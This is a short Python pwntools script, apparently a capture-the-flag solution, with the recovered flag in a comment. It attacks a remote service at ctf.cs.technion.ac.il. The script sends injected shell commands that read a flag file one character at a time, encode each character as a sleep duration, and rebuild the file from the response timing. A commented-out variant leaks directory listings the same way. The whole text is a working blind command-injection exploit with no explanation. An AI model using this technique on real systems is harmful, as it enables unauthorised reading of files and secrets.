#!/usr/bin/python3
#cstechnion{t1m1ng_1s_3very7h1ng}
from pwn import *

i = 1
j = 1
while True:
	p = remote("ctf.cs.technion.ac.il", 4015, level='error')
	p.recv()
	#p.sendline("sleep $(expr $(printf \"%d\\n\" \"\'$(ls | sed -n 1p | cut -c {})\") - 96)".format(i).encode())
	p.sendline("sleep $(python3 -c \"print($(printf \"%d\\n\" \"\'$(cat ./flag/flag.txt/* | sed -n {}p | cut -c {})\") / 40)\")".format(i, j).encode())
	r = p.recv().decode().split("\n")[0][16:22]
	#print(chr(int(float(r)+96)), end="")
	#print(r)
	if chr(int(float(r)*40)) == '\0':
		print()
		i+=1
		j=1
	else:
		print(chr(int(float(r)*40)), end="")
		j+=1
